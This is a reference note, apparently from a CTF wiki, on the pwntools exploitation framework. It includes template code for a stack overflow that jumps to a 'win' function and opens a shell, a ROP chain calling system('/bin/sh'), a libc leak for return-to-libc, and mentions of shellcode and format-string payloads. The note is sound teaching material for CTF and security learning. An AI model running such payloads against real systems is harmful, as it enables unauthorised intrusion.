---
title: "pwntools"
type: tool
tags: [ctf, pwn, binary, exploit-dev, python]
date_created: 2026-06-16
date_updated: 2026-06-16
sources: []
phase: aux
---

## Purpose

**pwntools** is a Python CTF exploitation framework for binary exploitation and RE automation: I/O with local/remote processes, ELF parsing, ROP building, packing helpers, and shellcode generation.

## Install / setup

```bash
pip install pwntools          # provides the `pwn` module + CLI (pwn, checksec, cyclic)
```

## Core usage

```python
from pwn import *
context.binary = e = ELF('./vuln')        # sets arch/bits/endianness automatically
context.log_level = 'debug'               # show all I/O

io = process('./vuln')                    # local
# io = remote('host', 1337)               # remote target
# io = gdb.debug('./vuln', 'b *main\nc')  # spawn under gdb

io.recvuntil(b'> ')
payload  = b'A'*40                         # offset (find with cyclic)
payload += p64(e.sym['win'])               # pack address (p32/p64, u32/u64 to unpack)
io.sendline(payload)
io.interactive()                           # drop to shell
```

## Common use cases

```python
# Find the overflow offset
cyclic(200)                               # send as input
cyclic_find(0x6161616c)                   # RSP/EIP value -> exact offset
```
```python
# ROP chain
rop = ROP(e)
rop.raw(rop.find_gadget(['pop rdi','ret']))
rop.raw(next(e.search(b'/bin/sh')))
rop.call(e.plt['system'])
```
```python
# Leak libc, resolve, return-to-libc
libc = ELF('./libc.so.6')
leak = u64(io.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']    # rebase
system = libc.sym['system']
```
- `shellcraft` + `asm()` for custom shellcode; `fmtstr_payload()` for format-string writes; `ssh()` for remote boxes.
- CLI: `checksec ./vuln`, `pwn cyclic 100`, `pwn disasm`, `pwn shellcraft amd64.linux.sh`.

## Tips and gotchas
- Always set `context.binary` first; it fixes wrong-endian packing bugs.
- Match the remote libc exactly (use the provided `libc.so.6`); test the chain locally with `LD_PRELOAD`/patchelf before going remote.
- `recvuntil`/`recvline` over `recv` for reliable sync; `flat({offset: value})` builds padded payloads cleanly.

## Related techniques
[[binary-exploitation]], [[reverse-engineering]], [[fuzzing]]. Debug with [[gdb-gef]].

## Sources
